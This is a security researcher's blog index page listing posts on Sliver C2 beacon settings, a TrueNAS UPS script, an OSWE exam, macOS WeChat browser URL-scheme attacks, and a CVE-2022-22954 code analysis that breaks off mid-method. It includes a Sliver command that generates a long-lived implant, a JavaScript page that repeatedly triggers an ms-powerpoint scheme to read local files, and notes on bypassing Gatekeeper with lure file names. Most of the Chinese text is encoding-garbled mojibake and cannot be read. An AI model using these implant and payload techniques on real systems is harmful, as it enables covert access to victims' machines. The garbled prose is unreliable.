<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Posts :: Ca1s1&#39;Blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://vuln.top/posts/" />






  
  
  
  
  
  <link rel="stylesheet" href="https://vuln.top/styles.css">







  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Posts">
<meta property="og:description" content="" />
<meta property="og:url" content="https://vuln.top/posts/" />
<meta property="og:site_name" content="Ca1s1&#39;Blog" />

  
    <meta property="og:image" content="https://vuln.top/img/favicon/green.png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">





  <link href="/posts/index.xml" rel="alternate" type="application/rss+xml" title="Ca1s1&#39;Blog" />









</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://vuln.top/">
  <div class="logo">
    Ca1s1'Blog
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;â–¾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about/">about</a></li>
        
      
        
          <li><a href="/link/">link</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about/" >about</a></li>
        
      
        
          <li><a href="/link/" >link</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
  
  <div class="posts">
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://vuln.top/posts/sliver-reconnect/">SliveræœåŠ¡ç«¯å£ä¸¢å¤±å®¢æˆ·ç«¯è‡ªåŠ¨æ–­å¼€</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2025-02-22 ::
            </time>
          
          
            <span class="post-author">ca1s1</span>
          
        </div>

        
          <span class="post-tags">
            
            #<a href="https://vuln.top/tags/sliver/">sliver</a>&nbsp;
            
            #<a href="https://vuln.top/tags/config/">config</a>&nbsp;
            
          </span>
        

        


        <div class="post-content">
          
            <blockquote>
<p><strong>sliver</strong>  <em>&ndash;max-errors</em>å€¼ä¸º 1000ï¼Œ<em>&ndash;reconnect</em>è®¾ç½®ä¸º 60 ç§’ï¼›è¿™æ„å‘³ç€å¦‚æœä¹‹å‰çš„è¿æ¥å¤±è´¥ï¼Œæ¤å…¥ç‰©åº”è¯¥æ¯ 60 ç§’å°è¯•é‡æ–°è¿æ¥ä¸€æ¬¡ï¼Œæœ€å¤š 1000 æ¬¡ï¼Œå¤§çº¦ 16 å°æ—¶ã€‚</p>
</blockquote>
<p>è™½ç„¶ä¸èƒ½å…³é—­<em>max-errors</em>ï¼Œä½†æ˜¯å¯ä»¥è®¾ç½®ä¸€ä¸ªè¶…å¤§å€¼æ¥è¿‘äºæ— é™æœŸã€‚</p>
<p>è¿™æ˜¯reconnectä¸º12ä¸ªå°æ—¶ï¼Œç†è®ºä¸Šå¯ä»¥é‡æ–°å°è¯•250å¤©
<code>generate beacon --mtls 0.0.0.0:4444 --os linux --arch amd64 --save /tmp/ --hours 4 --jitter 3 --reconnect 43200</code></p>
<blockquote>
<p>å‚è€ƒï¼š
<a href="https://github.com/BishopFox/sliver/issues/1253">https://github.com/BishopFox/sliver/issues/1253</a></p>
</blockquote>
          
        </div>

        
          <div>
            <a class="read-more button" href="/posts/sliver-reconnect/"> â†’</a>
          </div>
        
      </article>
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://vuln.top/posts/truenas-ut650egc-ups/">Truenas å®‰è£… UT650EGC UPS</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2024-03-20 ::
            </time>
          
          
            <span class="post-author">Ca1s1</span>
          
        </div>

        
          <span class="post-tags">
            
            #<a href="https://vuln.top/tags/ups/">UPS</a>&nbsp;
            
          </span>
        

        


        <div class="post-content">
          
            <h1 id="truenas-å®‰è£…-ut650egc-ups">Truenas å®‰è£… UT650EGC UPS</h1>
<p>é»˜è®¤æƒ…å†µä¸‹é€šè¿‡webå¯åŠ¨upsæœåŠ¡åŠŸèƒ½ï¼ŒTruenasä¼šæŠ¥æœåŠ¡å‡ºé”™<code>/run/nut/upsmon.pid: No space left on device</code>
é€‰äº†å¥½å‡ ä¸ªé©±åŠ¨ä¹Ÿä¸è¡Œï¼Œé—®å®¢æœå’Œå”®åä¹Ÿä¸æ‡‚ï¼Œåªèƒ½è‡ªå·±è§£å†³ã€‚</p>
<p>é€šè¿‡è¿™ç¯‡æ–‡ç« æ‰‹åŠ¨è°ƒé€šäº†NUT
<a href="https://www.wangchucheng.com/zh/posts/setting-up-ups-with-nut-on-linux/">https://www.wangchucheng.com/zh/posts/setting-up-ups-with-nut-on-linux/</a>
å†™ä¸€ä¸ªbashè„šæœ¬æ¯æ¬¡å¼€å¯è‡ªå¯å°±è¡Œäº†ã€‚</p>
<pre tabindex="0"><code>#!/bin/bash


config=&#34;maxretry = 3
[myupsname][JEB_Debug_Encrypt](assets/JEB_Debug_Encrypt.md)
  driver = usbhid-ups
  port = auto
  desc = \&#34;My UPS\&#34;
&#34;


echo &#34;$config&#34; &gt; /etc/nut/ups.conf


/sbin/upsdrvctl start


config1=&#34;[monuser]
  password = mypass
  upsmon master&#34;


echo &#34;$config1&#34; &gt; /etc/nut/upsd.users

chown root:nut /etc/nut/upsd.conf /etc/nut/upsd.users
chmod 0640 /etc/nut/upsd.conf /etc/nut/upsd.users

/sbin/upsd -c reload

echo &#34;MODE=standalone&#34; &gt; /etc/nut/nut.conf

/bin/upsc myupsname@localhost

config3=&#34;POWERDOWNFLAG /etc/killpower
MONITOR myupsname@localhost 1 monuser mypass master
SHUTDOWNCMD \&#34;/sbin/shutdown -P now\&#34;&#34;

echo &#34;$config3&#34; &gt; /etc/nut/upsmon.conf
chown root:nut /etc/nut/upsmon.conf
chmod 0640 /etc/nut/upsmon.conf

/sbin/upsmon -c reload
</code></pre>
          
        </div>

        
          <div>
            <a class="read-more button" href="/posts/truenas-ut650egc-ups/"> â†’</a>
          </div>
        
      </article>
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://vuln.top/posts/oswe/">OSWEè€ƒè¯•æ€»ç»“</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2023-06-19 ::
            </time>
          
          
            <span class="post-author">ca1s1</span>
          
        </div>

        
          <span class="post-tags">
            
            #<a href="https://vuln.top/tags/%E8%80%83%E8%AF%95/">è€ƒè¯•</a>&nbsp;
            
            #<a href="https://vuln.top/tags/oswe/">oswe</a>&nbsp;
            
            #<a href="https://vuln.top/tags/%E8%AE%A4%E8%AF%81/">è®¤è¯</a>&nbsp;
            
          </span>
        

        


        <div class="post-content">
          
            <h2 id="æ—¶é—´è®°å½•">æ—¶é—´è®°å½•</h2>
<p>å¼€å§‹æ—¶é—´17æ—¥æ—©ä¸Š6ç‚¹ï¼Œé‚£å¤©æ­£å¥½æˆ‘çš„ä»£ç†è¿‡æœŸäº†ï¼Œè€ƒè¯•ç½‘ç»œå¼„äº†2ä¸ªå°æ—¶ã€‚ã€‚ç®—æ˜¯8ç‚¹æ‰å¼€å§‹åšã€‚</p>
<table>
  <thead>
      <tr>
          <th>ç›®æ ‡</th>
          <th>æ—¶é—´</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>ç¬¬ä¸€å°auth bypass</td>
          <td>17æ—¥13:28</td>
      </tr>
      <tr>
          <td>ç¬¬ä¸€å°system</td>
          <td>17æ—¥18:32</td>
      </tr>
      <tr>
          <td>ç¡è§‰</td>
          <td>18æ—¥3:00-8:00</td>
      </tr>
      <tr>
          <td>ç¬¬äºŒå°auth bypass</td>
          <td>18æ—¥9:29</td>
      </tr>
      <tr>
          <td>ç¬¬äºŒå°system</td>
          <td>æ²¡çœ‹å¤ªç´¯äº†ç›´æ¥ç»“æŸã€‚ã€‚</td>
      </tr>
  </tbody>
</table>
<h2 id="è‡ªæˆ‘ä»‹ç»">è‡ªæˆ‘ä»‹ç»</h2>
<p>ä»¥å‰å‚åŠ è¿‡å‡ æ¬¡CTFæ¯”èµ›ï¼Œä¸»è¦æ–¹å‘å°±æ˜¯Webï¼Œè‡ªå·±å®¡è®¡è¿‡å‡ å¥—phpçš„cmsï¼Œæ‰€ä»¥ä¸ç®—çº¯å°ç™½ï¼Œæˆ‘æŠŠé™¤äº†è¯¾ä»¶ä¸Šçš„3é“è¯¾åé¢˜åšäº†ä¸€éæ„Ÿè§‰éš¾åº¦ä¸­ç­‰ï¼Œå°±å‡†å¤‡é¢„çº¦è€ƒè¯•äº†ã€‚</p>
<h2 id="è€ƒè¯•">è€ƒè¯•</h2>
<p>è€ƒè¯•æœ‰5å°æœºå™¨ï¼Œ2å°ç”¨äºè°ƒè¯•ï¼Œ2å°ç›®æ ‡æœºå™¨ï¼Œ1å°kaliï¼Œæˆ‘æœ‰oscpè€ƒè¯•çš„ç»éªŒï¼Œæ‰€ä»¥ä¸Šå»å…ˆå°†æ‰€æœ‰æœºå™¨è¿›è¡Œäº†é‡ç½®ï¼ˆoscpæ²¡æœ‰é‡ç½®é‡åˆ°å‘äº†ã€‚ã€‚ï¼‰ï¼Œä½†æ˜¯é‚£å¤©æˆ‘ä»£ç†æ­£å¥½è¿‡æœŸäº†ï¼Œæœ‰ç‚¹å€’éœ‰ï¼Œæ—©ä¸Šåˆšå¼€å§‹å°±æµªè´¹2ä¸ªå°æ—¶ï¼Œä½†æ˜¯ç½‘é€Ÿæƒ…å†µè¿˜å¯ä»¥ï¼Œguiè¿œç¨‹è°ƒè¯•åŸºæœ¬æ²¡é—®é¢˜ã€‚</p>
<p>éš¾åº¦è‚¯å®šæ˜¯æ¯”OSCPéš¾çš„ï¼Œä½†æ˜¯ç›¸è¾ƒäºå›½å†…CTFè¿˜æ˜¯ç›¸å¯¹ç®€å•ï¼Œä¸éœ€è¦åƒCTFä¸€æ ·è€ƒè„‘æ´ï¼Œä¸€èˆ¬æƒ…å†µæ˜¯å¤šä¸ªåŸºç¡€æ¼æ´ç»„åˆèµ·æ¥è·å¾—æƒé™ã€‚ä¸»è¦å›°éš¾æ˜¯åœ¨è¿™ä¹ˆå¤šä»£ç ä¸­æ‰¾åˆ°å­˜åœ¨æ¼æ´çš„ç‚¹ï¼ˆä¼šæœ‰å…”å­æ´ï¼‰ï¼ŒåŸºæœ¬éœ€è¦é€šè¯»æ‰€æœ‰ä»£ç ï¼Œè¿˜æ˜¯æ¯”è¾ƒç´¯çš„ã€‚</p>
<p>è€ƒè¯•å‰å»ºè®®è®¤çœŸçœ‹ä¸€éè€ƒè¯•è§„åˆ™ï¼Œå’Œè€ƒè¯•æŠ¥å‘Šçš„æ¨¡ç‰ˆï¼Œè¿™æ ·ä¸è‡³äºå¿˜è®°æˆªå›¾ã€‚</p>
<p>æå‰å‡†å¤‡å¥½éœ€è¦ç”¨çš„è„šæœ¬ï¼Œæ¯”å¦‚sqlæ³¨å…¥è„šæœ¬ç­‰ç­‰ï¼Œè€ƒè¯•çš„æ—¶å€™ç›´æ¥æ”¹å°±è¡Œã€‚</p>
<p>è€ƒè¯•æ—¶é—´ä¸€å®šè¦æå‰é¢„çº¦æœ¬æ¥æˆ‘ä¸€ä¸ªæœˆå‰å°±æƒ³è€ƒäº†ï¼Œä½†æ˜¯å·²ç»æ²¡æœ‰å‘¨å…­å‘¨æ—¥çš„è€ƒè¯•æ—¶é—´äº†ï¼Œæˆ‘åªèƒ½é¢„çº¦ä¸‹ä¸ªæœˆçš„ï¼Œè¿˜æ˜¯æ—©ä¸Šå…­ç‚¹è€ƒè¯•ï¼Œæˆ‘äººè¿·è¿·ç³Šç³Šçš„æœ‰ä¸€æ®µæ—¶é—´åŸºæœ¬éƒ½åœ¨æ¢¦æ¸¸ã€‚ã€‚</p>
<p>è€ƒè¯•è‡³å°‘éœ€è¦85åˆ†ï¼ˆæ»¡åˆ†100ï¼‰ï¼Œæ‹¿åˆ°Auth Bypass 35åˆ†ï¼Œè·å¾—ç³»ç»Ÿæƒé™15åˆ†ï¼Œä¸€å…±2å°æœºå™¨ç›¸å½“äºè‡³å°‘è¦å®Œæˆä¸€ä¸ªå®Œæ•´é¶æœºå’Œä¸€ä¸ªAuth Bypassã€‚</p>
<p>è€ƒè¯•å®Œç¬¬äºŒå¤©å°±å‘è¯ä¹¦äº†ï¼Œé€Ÿåº¦è¿˜æ˜¯æŒºå¿«çš„QAQ</p>
<h2 id="ä¸ºä»€ä¹ˆè¦è€ƒ-oswe">ä¸ºä»€ä¹ˆè¦è€ƒ OSWE</h2>
<p>è¿™å‡ å¹´å·¥ä½œä¸‹æ¥æ„Ÿè§‰å¯¹æŠ€æœ¯çš„æ¸´æœ›ä¸‹é™äº†ä¸å°‘ï¼Œæƒ°æ€§å æ®ä¸Šé£ï¼Œéœ€è¦ä¸€ä¸ªç›®æ ‡æ¥é­ç­–è‡ªå·±ï¼Œä¸è®©è‡ªå·±çŠ¯æ‡’ã€‚æˆ‘è§‰å¾—Offensive Security è®¤è¯ä½“ç³»å¾ˆä¸é”™ï¼Œæˆ‘æŒºå–œæ¬¢çš„ï¼Œä¸å–œæ¬¢å›½å†…æŸäº›ç»™é’±å°±èƒ½è¿‡çš„è€ƒè¯•ï¼Œæ‰€ä»¥æˆ‘å®šçš„ç›®æ ‡æ˜¯æ‹¿åˆ°OSCE3ï¼Œå¸Œæœ›èƒ½å¤ŸæˆåŠŸã€‚</p>
<p><strong>Try Harder</strong></p>
          
        </div>

        
          <div>
            <a class="read-more button" href="/posts/oswe/"> â†’</a>
          </div>
        
      </article>
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://vuln.top/posts/my-first-post/">MACä¸‹å¾®ä¿¡æµè§ˆå™¨å¯èƒ½å¯è¡Œçš„åˆ©ç”¨æ–¹å¼</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2023-04-24 ::
            </time>
          
          
            <span class="post-author">Ca1s1</span>
          
        </div>

        
          <span class="post-tags">
            
            #<a href="https://vuln.top/tags/rce/">rce</a>&nbsp;
            
            #<a href="https://vuln.top/tags/%E7%A0%94%E7%A9%B6/">ç ”ç©¶</a>&nbsp;
            
          </span>
        

        


        <div class="post-content">
          
            <p>åœ¨MACä¸‹çš„å¾®ä¿¡æµè§ˆå™¨ï¼Œä¸å…¶ä»–æµè§ˆå™¨ä¸åŒï¼Œé€šè¿‡åœ¨ç¬”è®°ä¸­æ·»åŠ åè®®ï¼Œåœ¨ç”¨æˆ·ç‚¹å‡»åä¼šè‡ªåŠ¨æ‰§è¡Œurl schemeåè®®ï¼Œç”¨æˆ·æ— éœ€ç¡®è®¤å³å¯æ‰§è¡Œã€‚</p>
<p>ä¸‹é¢åˆ—å‡ºå‡ ç§å¯è¡Œçš„æ”»å‡»æ–¹æ¡ˆï¼Œä½†æ˜¯è¿˜æ²¡æœ‰æ‰¾åˆ°ä¸€ç§æ¯”è¾ƒå®Œç¾çš„ï¼š</p>
<p>1ã€é€šè¿‡fileåè®®å¯ç›´æ¥æ‰§è¡Œappæ–‡ä»¶ï¼Œä½†æ˜¯å‰ææ˜¯éœ€è¦æ–‡ä»¶è½åœ°ï¼Œæ‰€ä»¥éœ€è¦é¢„å…ˆå°†æ–‡ä»¶ä¼ è¾“ï¼Œä½†æ˜¯å¦‚æœé€šè¿‡httpç­‰æ–¹å¼ä¸‹è½½æ–‡ä»¶è¿è¡Œappæ˜¯ä¼šè§¦å‘åˆ°macçš„Gatekeepæœºåˆ¶å¯¼è‡´æ— æ³•ç›´æ¥è¿è¡Œã€è€Œåœ¨MAC OS10.15ç‰ˆæœ¬åé€šè¿‡smbç­‰æ–¹å¼ä¼ è¾“çš„æ–‡ä»¶ä¼šå­˜åœ¨LSOpenURLsWithRole() failed with error -10810é”™è¯¯å¯¼è‡´æ— æ³•è¿è¡Œï¼Œå³ä½¿ä½ å…¨éƒ¨éƒ½ç»•è¿‡ï¼Œæ”»å‡»è€…ä»ç„¶éœ€è¦åœ¨çŸ¥é“æ–‡ä»¶è·¯å¾„çš„æƒ…å†µä¸‹ï¼Œå†è®©å…¶ç‚¹å‡»é“¾æ¥ï¼Œæ‰€ä»¥è¿™ç§æ”»å‡»éš¾åº¦è¾ƒé«˜ã€‚</p>
<p>2ã€é€šè¿‡MAC OSæœ¬èº«ä¸€äº›è½¯ä»¶å­˜åœ¨çš„URL Schemesï¼Œå¦‚æœè¿™äº›è½¯ä»¶çš„URL Schemeså­˜åœ¨æ¼æ´æˆ–è€…å¯ä»¥bypasså³å¯å®ç°æ”»å‡»ï¼Œå¦‚é€šè¿‡<a href="https://blog.chichou.me/2020/07/01/x-site-escape-part-iii-cve-2020-9860-a-copycat/">c</a>ve-2020-9860ï¼Œå…·ä½“å¯ä»¥çœ‹<a href="https://blog.chichou.me/2020/07/01/x-site-escape-part-iii-cve-2020-9860-a-copycat/">https://blog.chichou.me/2020/07/01/x-site-escape-part-iii-cve-2020-9860-a-copycat/</a>ï¼Œä½†è¿™</p>
<p>ç§æ”»å‡»æ–¹å¼æˆæœ¬è¾ƒé«˜ï¼Œéœ€è¦é…åˆMACOSä¸Šçš„æ¼æ´æˆ–å…¶ä»–å¸¸ç”¨è½¯ä»¶æ‰“ç»„åˆæ‹³æ‰èƒ½RCEã€‚æˆ‘é€šè¿‡å°†æœ¬åœ°æ‰€æœ‰çš„URL Schemesè¿›è¡Œéå†ã€‚</p>
<p>æ‰¾åˆ°ms-powerpoint:///etc/hostsï¼Œé€šè¿‡å¾®è½¯çš„PPT URL Schemeså¯ä»¥è¯»å–åˆ°æœ¬åœ°çš„æ–‡ä»¶ï¼Œ</p>
<p>å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;<span style="color:#a6e22e">Loading</span>...&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setInterval</span>(() =&gt; {<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ms-powerpoint:///etc/hosts&#39;</span>}, <span style="color:#ae81ff">2000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>åœ¨è¿™ç§æƒ…å†µä¸‹å…¶å®åªéœ€è¦æ‰¾åˆ°ä¸€ç§ï¼Œå°†æ–‡ä»¶é‡å®šå‘åˆ°å¤–ç½‘æœåŠ¡å™¨çš„æ–¹æ³•å³å¯è¯»å–åˆ°ä»»æ„æ–‡ä»¶ï¼Œè™½ç„¶é€šè¿‡æµ‹è¯•å‘ç°smbå¯ä»¥ä¸ç”¨è¾“å…¥è´¦æˆ·å¯†ç å³å¯è¿æ¥vpsï¼Œä½†æ˜¯ç”±äºæˆ‘åŸºæœ¬åŠŸå¤ªèœæš‚æ—¶æ²¡æœ‰æ‰¾åˆ°å¦‚ä½•ä¼ è¾“ã€‚</p>
<p>3ã€åˆ©ç”¨è‡ªå®šä¹‰åˆ°URL Schemeè¿œç¨‹çªç ´MAC</p>
<p>WINDSHIFT APTç»„ç»‡æ›¾ç»é€šè¿‡è¯¥æ–¹æ³•è¿œç¨‹æ„ŸæŸ“MACOSç›®æ ‡ä¸»æœºï¼Œåœ¨MACOSä¸­åº”ç”¨ç¨‹åºå¯ä»¥â€œå£°æ˜â€è‡ªå·±èƒ½å¤Ÿæ”¯æŒï¼ˆæˆ–è€…â€œå¤„ç†â€ï¼‰å„ç§æ–‡æ¡£ç±»å‹ä»¥åŠ/æˆ–è€…è‡ªå®šä¹‰çš„URL Schemeï¼Œä¸”è‡ªå®šä¹‰çš„æ–¹å¼éå¸¸ç®€å•åªéœ€è¦åœ¨APPæ–‡ä»¶ä¸­çš„Info.plistæ–‡ä»¶åŠ å…¥URL Typeæ•°ç»„å³å¯å®ç°ï¼Œè€Œä¸”åªéœ€è¦APPæ–‡ä»¶è½åœ°åˆ°ç›®æ ‡æœºå™¨ï¼ŒMACOSä¼šè‡ªåŠ¨æŸ¥æ‰¾APPæ–‡ä»¶ä¸­Info.plistæ–‡ä»¶æ˜¯å¦å­˜åœ¨URL Typeså¦‚æœå­˜åœ¨è‡ªåŠ¨æ³¨å†Œã€‚</p>
<p>é€šè¿‡MACOSé»˜è®¤çš„Safariæµè§ˆå™¨ä¸‹è½½å‹ç¼©åŒ…ï¼Œåä¼šè‡ªåŠ¨è§£å‹æ–‡ä»¶ï¼Œä»è€Œæ–‡ä»¶è½åœ°è‡ªå®šä¹‰URL Schemeåœ¨é€šè¿‡ç‚¹å‡»é“¾æ¥è§¦å‘è‡ªå®šä¹‰çš„URL Schemeã€‚ä½†æ˜¯è¿™ç§æ–¹å¼éœ€è¦ç»•è¿‡Gatekeeperå’Œæ–‡ä»¶éš”ç¦»ï¼ŒGatekeeperå¯ä»¥é€šè¿‡ç»™APPæ–‡ä»¶ç­¾åç»•è¿‡ï¼Œæ–‡ä»¶éš”ç¦»éœ€è¦é€šè¿‡ç»™æ–‡ä»¶åæ·»åŠ è¯±æƒ‘æ€§æ–‡å­—ï¼Œè®©å…¶ç‚¹å‡»æœ‰ç‚¹ç±»ä¼¼ç¤¾å·¥æ–¹å¼æ‰èƒ½å®ç°ã€‚è™½ç„¶éœ€è¦ç”¨æˆ·äº¤äº’ï¼Œç„¶è€Œè¿™ç§åŠŸèƒ½å·²ç»åœ¨å®é™…æ”»å‡»æ´»åŠ¨ä¸­è¢«æˆåŠŸåˆ©ç”¨ã€‚å…·ä½“æ“ä½œå¯ä»¥çœ‹<a href="https://www.anquanke.com/post/id/158679">https://www.anquanke.com/post/id/158679</a>ã€‚</p>
          
        </div>

        
          <div>
            <a class="read-more button" href="/posts/my-first-post/"> â†’</a>
          </div>
        
      </article>
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://vuln.top/posts/cve-2022-22954/">CVE-2022-22954</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2023-01-23 ::
            </time>
          
          
            <span class="post-author">Ca1s1</span>
          
        </div>

        
          <span class="post-tags">
            
            #<a href="https://vuln.top/tags/%E5%A4%8D%E7%8E%B0/">å¤ç°</a>&nbsp;
            
            #<a href="https://vuln.top/tags/cve/">CVE</a>&nbsp;
            
          </span>
        

        


        <div class="post-content">
          
            <h1 id="cve-2022-22954">CVE-2022-22954</h1>
<h2 id="ä»£ç åˆ†æ">ä»£ç åˆ†æ</h2>
<p><a href="http://file.xipudata.com/?dir=/2_software/Vmware/Horizon8">http://file.xipudata.com/?dir=/2_software/Vmware/Horizon8</a>
ä¸‹è½½å¥½ovaï¼Œä½¿ç”¨vmwareå®‰è£…æ­å»ºï¼Œå¯¼å…¥æ—¶æ·»åŠ ä¸‹åŸŸåã€‚
<img src="/img/16534685569681/16534686232696.jpg" alt="">
æ ¹æ®å®˜æ–¹æä¾›çš„ä¸´æ—¶ä¿®å¤è„šæœ¬å¯ä»¥çŸ¥é“æ¼æ´å­˜åœ¨äº
<code>/opt/vmware/horizon/workspace/webapps/catalog-portal/WEB-INF/lib/endusercatalog-ui-1.0-SNAPSHOT-classes.jar</code>
<img src="/img/16534685569681/16534687156233.jpg" alt="">
ä¿®å¤è„šæœ¬ä¸­è¿˜æåˆ°äº†è¿™ä¸ªæ–‡ä»¶
<img src="/img/16534685569681/16534692518129.jpg" alt="">
æŸ¥çœ‹è¯¥æ–‡ä»¶åå‘ç°å­˜åœ¨evalï¼Œè¿™æ˜¯java freemarkerçš„å†™æ³•ï¼Œç”¨æ¥æŠŠå­—ç¬¦ä¸²å½“ä½œftlä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ§åˆ¶errorObjå³å¯å®ç°ä»£ç æ‰§è¡Œ
<img src="/img/16534685569681/16534695194137.jpg" alt="">
æ‰€ä»¥æˆ‘ä»¬çŸ¥é“æ¼æ´æ¥æºäºcustomError,æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¯ä»¥åˆ°è¾¾customErrorçš„è·¯ç”±ï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶errorObj
åœ¨UiErrorController.classä¸­å¯ä»¥æ‰¾åˆ°handleGenericErrorï¼Œå¯ä»¥ä¼ é€’errorObjï¼Œæœ€åreturnåˆ°customError</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">handleGenericError</span>(<span style="color:#66d9ef">final</span> HttpServletRequest request, <span style="color:#66d9ef">final</span> HttpServletResponse response, <span style="color:#66d9ef">final</span> Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> model, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> isAWJade, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> garnetAndAbove, <span style="color:#66d9ef">final</span> String excpClass, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> errorCode, <span style="color:#66d9ef">final</span> String errorMessage) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String localizedMessageHeader <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">messages</span>.<span style="color:#a6e22e">getLocalizedErrorMessage</span>(<span style="color:#e6db74">&#34;errorPage.errorHeading&#34;</span>, request.<span style="color:#a6e22e">getLocale</span>(), (Object<span style="color:#f92672">[]</span>)<span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String localizedMessage <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">messages</span>.<span style="color:#a6e22e">getLocalizedErrorMessage</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getLocalizedMessageKey</span>(excpClass), request.<span style="color:#a6e22e">getLocale</span>(), (Object<span style="color:#f92672">[]</span>)<span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (errorCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1) {
</span></span><span style="display:flex;"><span>            response.<span style="color:#a6e22e">setStatus</span>(errorCode);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;errorObj&#34;</span>, errorMessage);
</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;messageHeader&#34;</span>, localizedMessageHeader);
</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;genericErrorMsg&#34;</span>, localizedMessage);
</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;contextPath&#34;</span>, request.<span style="color:#a6e22e">getContextPath</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (isAWJade) {
</span></span><span style="display:flex;"><span>            WebUtils.<span style="color:#a6e22e">markCookiesForDeletion</span>(request, response, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;USER_CATALOG_CONTEXT&#34;</span> });
</span></span><span style="display:flex;"><span>            WebUtils.<span style="color:#a6e22e">markCookiesForDeletionWithPath</span>(request, response, <span style="color:#e6db74">&#34;/catalog-portal&#34;</span>, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;EUC_XSRF_TOKEN&#34;</span> });
</span></span><span style="display:flex;"><span>            model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;logoutPath&#34;</span>, retrieveServerInitiatedLogoutPath(garnetAndAbove).<span style="color:#a6e22e">getName</span>());
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">final</span> StringBuilder logoutUrl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder(request.<span style="color:#a6e22e">getContextPath</span>()).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;/ui&#34;</span>).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;/logout&#34;</span>);
</span></span><span style="display:flex;"><span>            String queryStr <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getQueryString</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (StringUtils.<span style="color:#a6e22e">isNotBlank</span>((CharSequence)queryStr)) {
